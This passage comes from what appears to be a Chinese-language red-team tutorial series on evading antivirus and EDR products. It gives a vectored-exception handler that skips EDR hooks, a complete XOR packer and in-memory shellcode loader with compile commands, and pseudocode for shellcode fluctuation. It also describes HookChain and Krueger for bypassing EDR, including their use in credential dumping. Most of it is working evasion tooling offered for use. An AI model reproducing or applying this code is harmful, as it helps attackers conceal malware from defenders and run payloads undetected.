<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">LONG WINAPI <span class="hljs-title">VectoredHandler</span><span class="hljs-params">(EXCEPTION_POINTERS* ExceptionInfo)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_SINGLE_STEP) &#123;<br>        ExceptionInfo-&gt;ContextRecord-&gt;Rip = (DWORD_PTR)hookBypassAddress; <span class="hljs-comment">// 跳过钩子</span><br>        <span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;<br>    &#125;<br>    <span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_SEARCH;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="步骤-4：设置流程"><a href="#步骤-4：设置流程" class="headerlink" title="步骤 4：设置流程"></a><strong>步骤 4：设置流程</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">AddVectoredExceptionHandler</span>(<span class="hljs-number">1</span>, VectoredHandler);<br><span class="hljs-built_in">SetHardwareBreakpoint</span>(<span class="hljs-built_in">GetCurrentThread</span>(), hookBypassAddress);<br><span class="hljs-built_in">NtOpenProcess</span>(...); <span class="hljs-comment">// 将跳过钩子</span><br></code></pre></td></tr></table></figure>

<p>这将绕过用户模式的 EDR 钩子 <strong>而不触及内存</strong>，绕过大多数检测机制。</p>
<hr>
<h3 id="5-另一种用法：通过-Shellcode-触发系统调用"><a href="#5-另一种用法：通过-Shellcode-触发系统调用" class="headerlink" title="5. 另一种用法：通过 Shellcode 触发系统调用"></a><strong>5. 另一种用法：通过 Shellcode 触发系统调用</strong></h3><p>你也可以在恶意软件或 shellcode 中使用硬件断点，<strong>将执行重定向到没有存根的系统调用</strong>——这在以下情况中特别有用：</p>
<ul>
<li><p>NTDLL 已被解除链接（例如，使用手动映射）。</p>
</li>
<li><p>系统调用被随机化（间接系统调用或 HellsGate 情况）。</p>
</li>
<li><p>你希望有条件地执行系统调用（例如，当特定内存模式匹配时）。</p>
</li>
</ul>
<hr>
<h3 id="6-检测面和风险"><a href="#6-检测面和风险" class="headerlink" title="6. 检测面和风险"></a><strong>6. 检测面和风险</strong></h3><table>
<thead>
<tr>
<th>风险</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>使用调试寄存器</td>
<td>如果 EDR 检查线程上下文，可能会被检测到。</td>
</tr>
<tr>
<td>向量异常处理程序</td>
<td>添加多个处理程序可能会被追踪。</td>
</tr>
<tr>
<td>访问冲突崩溃</td>
<td>设置不正确可能导致 EXCEPTION_SINGLE_STEP 问题。</td>
</tr>
<tr>
<td>需要线程挂起</td>
<td>在某些环境下，挂起线程可能会引发可疑行为。</td>
</tr>
</tbody></table>
<hr>
<h3 id="7-使用此技术的实际工具和恶意软件"><a href="#7-使用此技术的实际工具和恶意软件" class="headerlink" title="7. 使用此技术的实际工具和恶意软件"></a><strong>7. 使用此技术的实际工具和恶意软件</strong></h3><ul>
<li><p><strong>AtomBombing</strong>：通过修改原子表注入代码，并通过异常重定向执行。</p>
</li>
<li><p><strong>Turla Group</strong>：观察到使用 HWBP 进行隐蔽的内存访问。</p>
</li>
<li><p><strong>高级红队框架</strong>：可以通过 HWBP 打补丁系统调用，并绕过 ETW 钩子。</p>
</li>
</ul>
<hr>
<h3 id="8-红队员建议"><a href="#8-红队员建议" class="headerlink" title="8. 红队员建议"></a><strong>8. 红队员建议</strong></h3><ul>
<li><p>尽量避免 API 修补或内存去钩。</p>
</li>
<li><p>选择性使用 HWBP，并在执行后清理 DR 寄存器。</p>
</li>
<li><p>与直接系统调用或未钩住的 NTDLL（手动映射或系统调用存根）结合使用。</p>
</li>
<li><p>考虑在 <strong>自定义加载器</strong>、<strong>反射 DLL</strong> 或 <strong>内存代理</strong> 中实现此技术。</p>
</li>
</ul>
<h2 id="AV-EDR-规避实战技巧-8-10-构建-PE-打包器"><a href="#AV-EDR-规避实战技巧-8-10-构建-PE-打包器" class="headerlink" title="AV&#x2F;EDR 规避实战技巧 - 8.10 - 构建 PE 打包器"></a>AV&#x2F;EDR 规避实战技巧 - 8.10 - 构建 PE 打包器</h2><h3 id="目标-3"><a href="#目标-3" class="headerlink" title="目标"></a><strong>目标</strong></h3><p>创建一个简单的 Windows 可执行文件打包器，能够加密一个有效载荷 PE 文件并将其嵌入到一个加载器存根中，加载器在内存中解密并执行该有效载荷。这对于规避 AV&#x2F;EDR 的静态检测非常有用。</p>
<hr>
<h3 id="涉及的概念"><a href="#涉及的概念" class="headerlink" title="涉及的概念"></a><strong>涉及的概念</strong></h3><ul>
<li><p>PE 结构基础（头部、段）</p>
</li>
<li><p>有效载荷加密（基于 XOR）</p>
</li>
<li><p>解密并执行的加载器存根</p>
</li>
<li><p>反射加载</p>
</li>
<li><p><code>VirtualAlloc</code>、<code>CreateThread</code> 和 <code>WaitForSingleObject</code></p>
</li>
</ul>
<hr>
<h3 id="高层次工作流程"><a href="#高层次工作流程" class="headerlink" title="高层次工作流程"></a><strong>高层次工作流程</strong></h3><ol>
<li><p><strong>加密阶段（打包器）</strong>：</p>
<ul>
<li><p>获取一个二进制有效载荷（例如 <code>calc.exe</code>）</p>
</li>
<li><p>使用 XOR 加密其原始字节</p>
</li>
<li><p>将加密后的二进制嵌入到一个加载器 C++ 文件作为字节数组</p>
</li>
</ul>
</li>
<li><p><strong>解密和执行阶段（加载器）</strong>：</p>
<ul>
<li><p>加载器在运行时解密该数组</p>
</li>
<li><p>分配内存</p>
</li>
<li><p>使用 PE 加载技术（例如反射加载）或通过 <code>CreateProcess</code> 来执行有效载荷</p>
</li>
</ul>
</li>
</ol>
<hr>
<h3 id="步骤-1-有效载荷加密器（打包器工具）"><a href="#步骤-1-有效载荷加密器（打包器工具）" class="headerlink" title="步骤 1: 有效载荷加密器（打包器工具）"></a><strong>步骤 1: 有效载荷加密器（打包器工具）</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> XOR_KEY = <span class="hljs-number">0xAA</span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Usage: packer.exe &lt;input_payload.exe&gt; &lt;output_array.txt&gt;\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-function">std::ifstream <span class="hljs-title">infile</span><span class="hljs-params">(argv[<span class="hljs-number">1</span>], std::ios::binary)</span></span>;<br>    <span class="hljs-function">std::ofstream <span class="hljs-title">outfile</span><span class="hljs-params">(argv[<span class="hljs-number">2</span>])</span></span>;<br><br>    <span class="hljs-keyword">if</span> (!infile.<span class="hljs-built_in">is_open</span>() || !outfile.<span class="hljs-built_in">is_open</span>()) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;File error\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-function">std::vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt; <span class="hljs-title">buffer</span><span class="hljs-params">((std::istreambuf_iterator&lt;<span class="hljs-type">char</span>&gt;(infile)),</span></span><br><span class="hljs-params"><span class="hljs-function">                                      std::istreambuf_iterator&lt;<span class="hljs-type">char</span>&gt;())</span></span>;<br><br>    outfile &lt;&lt; <span class="hljs-string">&quot;unsigned char payload[] = &#123;\n&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; buffer.<span class="hljs-built_in">size</span>(); ++i) &#123;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> encrypted = buffer[i] ^ XOR_KEY;<br>        outfile &lt;&lt; <span class="hljs-string">&quot;0x&quot;</span> &lt;&lt; std::hex &lt;&lt; (<span class="hljs-type">int</span>)encrypted;<br>        <span class="hljs-keyword">if</span> (i &lt; buffer.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>) outfile &lt;&lt; <span class="hljs-string">&quot;, &quot;</span>;<br>        <span class="hljs-keyword">if</span> ((i + <span class="hljs-number">1</span>) % <span class="hljs-number">16</span> == <span class="hljs-number">0</span>) outfile &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>    outfile &lt;&lt; <span class="hljs-string">&quot;\n&#125;;\nunsigned int payload_len = &quot;</span> &lt;&lt; std::dec &lt;&lt; buffer.<span class="hljs-built_in">size</span>() &lt;&lt; <span class="hljs-string">&quot;;\n&quot;</span>;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Payload encrypted and saved.\n&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>编译命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">g++ -o packer packer.cpp<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="步骤-2-加载器存根（内存中执行加密的有效载荷）"><a href="#步骤-2-加载器存根（内存中执行加密的有效载荷）" class="headerlink" title="步骤 2: 加载器存根（内存中执行加密的有效载荷）"></a><strong>步骤 2: 加载器存根（内存中执行加密的有效载荷）</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-comment">// 包含步骤 1 的输出</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;payload_array.txt&quot;</span> <span class="hljs-comment">// 包含 `payload[]` 和 `payload_len`</span></span><br><br><span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> XOR_KEY = <span class="hljs-number">0xAA</span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 解密有效载荷</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; payload_len; ++i) &#123;<br>        payload[i] ^= XOR_KEY;<br>    &#125;<br><br>    <span class="hljs-comment">// 为有效载荷分配内存</span><br>    <span class="hljs-type">void</span>* exec = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-number">0</span>, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-keyword">if</span> (!exec) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to allocate memory.\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 复制解密后的有效载荷</span><br>    <span class="hljs-built_in">memcpy</span>(exec, payload, payload_len);<br><br>    <span class="hljs-comment">// 执行</span><br>    HANDLE thread = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)exec, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (!thread) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to create thread.\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">WaitForSingleObject</span>(thread, INFINITE);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>编译命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">g++ -o loader.exe loader.cpp -static<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a><strong>分析</strong></h3><p>这个基本的打包器能够规避基于静态签名的检测。可以通过以下方式进行改进：</p>
<ul>
<li><p>多态有效载荷数组</p>
</li>
<li><p>多重加密层（例如 XOR + AES）</p>
</li>
<li><p>执行后自我删除</p>
</li>
<li><p>使用反射 DLL 注入而非直接执行</p>
</li>
</ul>
<hr>
<h3 id="实际用例"><a href="#实际用例" class="headerlink" title="实际用例"></a><strong>实际用例</strong></h3><p>APT 组和恶意软件开发者使用自定义打包器来隐藏有效载荷。商业恶意软件通常使用 UPX 或专有的打包器来规避 AV 检测。上面的示例重现了这种行为的简化版本，供学习或 CTF&#x2F;红队使用。</p>
<h2 id="AV-EDR-规避实战技巧-8-11-Shellcode-波动：通过内存变异进行高级规避"><a href="#AV-EDR-规避实战技巧-8-11-Shellcode-波动：通过内存变异进行高级规避" class="headerlink" title="AV&#x2F;EDR 规避实战技巧 - 8.11 - Shellcode 波动：通过内存变异进行高级规避"></a>AV&#x2F;EDR 规避实战技巧 - 8.11 - Shellcode 波动：通过内存变异进行高级规避</h2><h3 id="概述-12"><a href="#概述-12" class="headerlink" title="概述"></a><strong>概述</strong></h3><p>Shellcode 波动是一种内存规避技术，旨在动态改变注入的 shellcode 的可访问性和可见性，从而避免被 EDR 和杀毒软件检测到。该技术涉及 <strong>内存保护更改（如 RW、RX、NOACCESS）</strong> 和 <strong>加密&#x2F;解密周期</strong>，并将其绑定到特定事件（如 Beacon 植入物中的睡眠行为）。</p>
<hr>
<h3 id="目标-4"><a href="#目标-4" class="headerlink" title="目标"></a><strong>目标</strong></h3><ul>
<li><p>理解如何实现 <strong>自我波动的 shellcode 加载器</strong>。</p>
</li>
<li><p>学习如何通过 <strong>挂钩 Sleep API</strong> 和使用 <strong>VEH（向量化异常处理程序）</strong> 实现隐秘执行。</p>
</li>
<li><p>实现 <strong>运行时内存权限更改</strong> 和 <strong>shellcode 加密</strong>，作为防御性规避策略。</p>
</li>
</ul>
<hr>
<h3 id="概念流程"><a href="#概念流程" class="headerlink" title="概念流程"></a><strong>概念流程</strong></h3><h4 id="技术-A：波动至-PAGE-READWRITE"><a href="#技术-A：波动至-PAGE-READWRITE" class="headerlink" title="技术 A：波动至 PAGE_READWRITE"></a><strong>技术 A：波动至 PAGE_READWRITE</strong></h4><ol>
<li><p><strong>Shellcode 准备</strong></p>
<ul>
<li><p>从磁盘读取加密的 shellcode。</p>
</li>
<li><p>通过 <code>VirtualAlloc</code> 分配内存，使用 <code>memcpy</code> 复制 shellcode，并通过 <code>CreateThread</code> 创建新线程。</p>
</li>
</ul>
</li>
<li><p><strong>挂钩 Sleep</strong></p>
<ul>
<li>内联挂钩 <code>kernel32!Sleep</code>，将其重定向到自定义函数 (<code>MySleep</code>)。</li>
</ul>
</li>
<li><p><strong>波动阶段</strong></p>
<ul>
<li><p>当 Beacon 调用 <code>Sleep</code> 时，<code>MySleep</code> 被调用。</p>
</li>
<li><p>在 <code>MySleep</code> 中，包含 shellcode 的内存区域：</p>
<ul>
<li><p>被标记为 <strong>PAGE_READWRITE</strong>。</p>
</li>
<li><p>内容被 <strong>XOR 加密</strong>。</p>
</li>
</ul>
</li>
<li><p>移除对 <code>Sleep</code> 的挂钩（避免 IOC）。</p>
</li>
<li><p>调用原始 <code>Sleep</code>（Beacon 休眠）。</p>
</li>
<li><p>休眠间隔结束后：</p>
<ul>
<li><p>内存被解密。</p>
</li>
<li><p>权限被切换回 <strong>PAGE_EXECUTE_READ</strong>。</p>
</li>
<li><p>再次挂钩 <code>Sleep</code>。</p>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<h4 id="技术-B：波动至-PAGE-NOACCESS"><a href="#技术-B：波动至-PAGE-NOACCESS" class="headerlink" title="技术 B：波动至 PAGE_NOACCESS"></a><strong>技术 B：波动至 PAGE_NOACCESS</strong></h4><ol>
<li><p><strong>向量化异常处理程序（VEH）</strong></p>
<ul>
<li>除了上述步骤外，还注册一个 VEH 来处理 <strong>访问冲突异常</strong>。</li>
</ul>
</li>
<li><p><strong>休眠后的执行</strong></p>
<ul>
<li><p>在 Beacon 休眠后，内存页面被标记为 <strong>PAGE_NOACCESS</strong>。</p>
</li>
<li><p>再次移除对 <code>Sleep</code> 的挂钩。</p>
</li>
<li><p>当 Beacon 尝试恢复时，发生 <strong>访问冲突</strong>。</p>
</li>
</ul>
</li>
<li><p><strong>VEH 处理程序</strong></p>
<ul>
<li><p>VEH 捕捉到该异常。</p>
</li>
<li><p>解密 shellcode，将保护切换回 <strong>PAGE_EXECUTE_READ</strong>，并恢复执行。</p>
</li>
</ul>
</li>
</ol>
<hr>
<h3 id="PAGE-NOACCESS-波动的代码伪代码"><a href="#PAGE-NOACCESS-波动的代码伪代码" class="headerlink" title="PAGE_NOACCESS 波动的代码伪代码"></a><strong>PAGE_NOACCESS 波动的代码伪代码</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 注册 VEH 处理程序</span><br>AddVectoredExceptionHandler(<span class="hljs-number">1</span>, VehCallback);<br><br><span class="hljs-comment">// 在 MySleep 回调中</span><br>VirtualProtect(shellcode, sc_size, PAGE_NOACCESS, &amp;oldProtect);<br>Sleep(duration);<br><br><span class="hljs-comment">// VEH 处理程序</span><br>LONG CALLBACK <span class="hljs-title function_">VehCallback</span><span class="hljs-params">(EXCEPTION_POINTERS* ExceptionInfo)</span> &#123;<br>    <span class="hljs-keyword">if</span> (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_ACCESS_VIOLATION) &#123;<br>        <span class="hljs-comment">// 解密并恢复 RX</span><br>        VirtualProtect(shellcode, sc_size, PAGE_EXECUTE_READ, &amp;oldProtect);<br>        decrypt_shellcode(shellcode, key);<br>        <span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;<br>    &#125;<br>    <span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_SEARCH;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a><strong>优点</strong></h3><ul>
<li><p><strong>内存扫描抗性</strong>：标记为 <code>PAGE_NOACCESS</code> 的页面无法被扫描或读取。</p>
</li>
<li><p><strong>休眠期间无 RWX 或 RX 页面</strong>：这些区域在 shellcode 执行期间隐藏，休眠时不可访问。</p>
</li>
<li><p><strong>防止 Dump</strong>：在休眠或空闲期间防止 shellcode 被 Dump。</p>
</li>
<li><p><strong>防止挂钩</strong>：通过动态解除挂钩 <code>Sleep</code>，使用无跳板的逻辑。</p>
</li>
</ul>
<hr>
<h3 id="实际应用-3"><a href="#实际应用-3" class="headerlink" title="实际应用"></a><strong>实际应用</strong></h3><ul>
<li><p><strong>Gargoyle</strong> 由 Josh Lospinoso 引入，通过 VirtualProtect 实现基于 ROP 的内存波动。</p>
</li>
<li><p><strong>ORCA666 的 0x41</strong> 演示了 VEH 辅助的访问控制执行和解密。</p>
</li>
</ul>
<hr>
<h3 id="实战应用：红队和威胁模拟"><a href="#实战应用：红队和威胁模拟" class="headerlink" title="实战应用：红队和威胁模拟"></a><strong>实战应用：红队和威胁模拟</strong></h3><p>该技术在现代进攻框架中被广泛应用，如：</p>
<ul>
<li><p>自定义 <strong>Beacon 加载器</strong>，</p>
</li>
<li><p><strong>Sliver</strong> 植入物与自定义 stager，</p>
</li>
<li><p>独立的 <strong>PE 加载器</strong> 用于恶意软件的阶段性和规避。</p>
</li>
</ul>
<p>此技术非常适用于 <strong>后期利用场景</strong>，在这些场景中，持久性和隐蔽性至关重要。</p>
<hr>
<h3 id="结论-4"><a href="#结论-4" class="headerlink" title="结论"></a><strong>结论</strong></h3><p>Shellcode 波动，尤其是结合 VEH 和选择性 API 挂钩，大大提高了被检测的难度。虽然并不新颖，但这种策略在现实世界的红队操作中仍然有效，特别是针对依赖于基于签名的内存扫描或简单行为模型的 EDR。</p>
<p>更多信息：<a target="_blank" rel="noopener" href="https://github.com/mgeeky/ShellcodeFluctuation">https://github.com/mgeeky/ShellcodeFluctuation</a></p>
<h2 id="AV-EDR-规避实战技巧-8-12-HookChain"><a href="#AV-EDR-规避实战技巧-8-12-HookChain" class="headerlink" title="AV&#x2F;EDR 规避实战技巧 - 8.12 - HookChain"></a>AV&#x2F;EDR 规避实战技巧 - 8.12 - HookChain</h2><p><strong>概述:</strong><br>HookChain 是一个开源框架，旨在绕过常见的用户模式 API 挂钩，这些挂钩通常由 EDR（端点检测与响应）系统实现。它在红队演练、恶意软件开发和 EDR 规避研究中非常有用。</p>
<p><strong>资源:</strong></p>
<ul>
<li><p>GitHub 仓库: <a target="_blank" rel="noopener" href="https://github.com/helviojunior/hookchain">https://github.com/helviojunior/hookchain</a></p>
</li>
<li><p>演示视频: <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=Rxw0DFkMeQ8">Sec4US Talk on YouTube</a></p>
</li>
</ul>
<hr>
<h3 id="目标-5"><a href="#目标-5" class="headerlink" title="目标"></a>目标</h3><p>HookChain 的目标是无需注入新的 DLL 或手动重建干净的系统调用存根，就可以解除挂钩或绕过所有可能被 EDR 监视或篡改的用户模式 API 函数（例如，<code>OpenProcess</code>、<code>ReadProcessMemory</code>、<code>VirtualAlloc</code> 等）。</p>
<hr>
<h3 id="HookChain-的工作原理"><a href="#HookChain-的工作原理" class="headerlink" title="HookChain 的工作原理"></a>HookChain 的工作原理</h3><p>HookChain 执行以下核心步骤：</p>
<ol>
<li><p><strong>从磁盘或内存加载干净的 DLL：</strong></p>
<ul>
<li><p>它从磁盘或嵌入内存中加载目标 DLL（如 <code>ntdll.dll</code>、<code>kernel32.dll</code> 等）的新鲜、未修改的副本。</p>
</li>
<li><p>这样可以避免依赖于已经加载的、可能被挂钩的版本。</p>
</li>
</ul>
</li>
<li><p><strong>解析干净的函数指针：</strong></p>
<ul>
<li>它解析这些干净 DLL 的导出表，以解析关键函数（如 <code>NtReadVirtualMemory</code>、<code>NtOpenProcess</code> 等）的地址。</li>
</ul>
</li>
<li><p><strong>覆盖被挂钩的函数：</strong></p>
<ul>
<li>然后，HookChain 通过 <strong>修补导入地址表（IAT）</strong> 或 <strong>动态解析函数</strong>，将执行重定向到未挂钩的干净版本 API。</li>
</ul>
</li>
<li><p><strong>通过避免使用系统调用存根来绕过检测：</strong></p>
<ul>
<li>它不会直接调用系统调用或来自挂钩 DLL 的 shellcode，而是通过自己加载的干净 DLL 路由函数调用。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h3><ul>
<li><p>无需重建系统调用存根。</p>
</li>
<li><p>完全绕过 EDR 的用户模式挂钩。</p>
</li>
<li><p>跨 Windows 版本兼容且便携。</p>
</li>
<li><p>支持 <strong>内存中解除挂钩</strong>，适用于无文件的 payload。</p>
</li>
<li><p>可动态绕过如 Windows Defender、CrowdStrike、Carbon Black 等常见 EDR 保护。</p>
</li>
</ul>
<hr>
<h3 id="实际使用案例-1"><a href="#实际使用案例-1" class="headerlink" title="实际使用案例"></a>实际使用案例</h3><p>在红队或进攻性场景中，你可能想要：</p>
<ol>
<li><p>在 Beacon 或植入物中加载 <code>HookChain</code>。</p>
</li>
<li><p>使用 HookChain 解析 <code>NtOpenProcess</code> 和 <code>NtReadVirtualMemory</code> 来执行凭证转储。</p>
</li>
<li><p>避免触发依赖于挂钩用户模式 API 的 EDR 警报。</p>
</li>
</ol>
<hr>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li><p>HookChain 支持多种模式，包括 <strong>IAT 修补</strong>、<strong>运行时动态解析</strong> 和 <strong>手动系统调用解析</strong>。</p>
</li>
<li><p>可以将干净的 DLL 作为加密的二进制块嵌入，以避免触碰磁盘。</p>
</li>
<li><p>该工具还可以与后期利用框架集成，或作为加载器&#x2F;投放工具的一部分进行编译。</p>
</li>
</ul>
<hr>
<h3 id="结论-5"><a href="#结论-5" class="headerlink" title="结论"></a>结论</h3><p>HookChain 是一个先进且模块化的框架，用于击败现代 EDR 部署的用户模式 API 挂钩。通过利用干净 DLL 加载和动态函数解析，它允许攻击者在不触发行为检测机制的情况下，隐秘地执行内存读取、进程注入或 shellcode 执行等敏感操作。</p>
<h2 id="AV-EDR-规避实战技巧-8-13-–-武器化-Windows-Defender-应用程序控制-WDAC"><a href="#AV-EDR-规避实战技巧-8-13-–-武器化-Windows-Defender-应用程序控制-WDAC" class="headerlink" title="AV&#x2F;EDR 规避实战技巧 - 8.13 – 武器化 Windows Defender 应用程序控制 (WDAC)"></a>AV&#x2F;EDR 规避实战技巧 - 8.13 – 武器化 Windows Defender 应用程序控制 (WDAC)</h2><p><strong>概述：</strong><br>Windows Defender 应用程序控制（WDAC）是微软的一项功能，用于强制执行代码完整性，在内核级别阻止未经授权的代码执行。然而，Logan Goins 的 Krueger 项目展示了当 WDAC 配置错误或被利用时，它可以被 <strong>武器化</strong> 用来 <strong>绕过 EDR</strong>，通过在 <strong>受信任的上下文中</strong> 运行未受监控的代码。</p>
<p><strong>仓库：</strong><br>🔗 <a target="_blank" rel="noopener" href="https://github.com/logangoins/Krueger">https://github.com/logangoins/Krueger</a><br>📖 文章: <a target="_blank" rel="noopener" href="https://beierle.win/2024-12-20-Weaponizing-WDAC-Killing-the-Dreams-of-EDR/">Weaponizing WDAC - Killing the Dreams of EDR</a></p>
<hr>
<h3 id="目标-6"><a href="#目标-6" class="headerlink" title="目标"></a>目标</h3><p>Krueger 的主要思想是 <strong>滥用 WDAC 的策略信任边界</strong>，通过 <strong>运行未签名或恶意代码</strong> 来 <strong>绕过 EDR 警报</strong>，利用已签名但存在漏洞的二进制文件（LoLBins）和绕过逻辑缺陷。</p>
<hr>
<h3 id="WDAC-的工作原理"><a href="#WDAC-的工作原理" class="headerlink" title="WDAC 的工作原理"></a>WDAC 的工作原理</h3><ul>
<li><p>WDAC 强制执行关于 <strong>允许运行哪些代码</strong> 的规则，基于发布者证书、文件路径、哈希规则等。</p>
</li>
<li><p>它使用 <strong>代码完整性（CI）策略</strong>，通常由管理员配置，用于限制未经批准的软件执行。</p>
</li>
<li><p>策略在 <strong>内核级别</strong> 强制执行，这使得用户模式的 EDR 解决方案很难覆盖或覆盖它。</p>
</li>
</ul>
<hr>
